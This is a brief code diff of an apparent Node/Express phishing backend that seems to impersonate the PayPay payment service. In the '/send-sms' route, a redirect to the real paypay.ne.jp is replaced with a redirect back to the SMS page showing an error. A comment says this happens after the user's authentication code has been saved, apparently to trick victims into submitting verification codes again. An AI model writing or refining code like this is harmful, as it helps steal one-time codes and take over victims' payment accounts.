@@ -63,7 +63,8 @@ app.post("/send-sms", async (req, res) => {
 
     console.log("sms送信成功");
     
-    res.redirect("https://paypay.ne.jp"); 
+    // 認証コードを保存した後、エラー表示でsms.htmlに戻す
+    res.redirect("/sms.html?error=2");
 
   } catch (error) {
     console.error("sms送信失敗:", error);
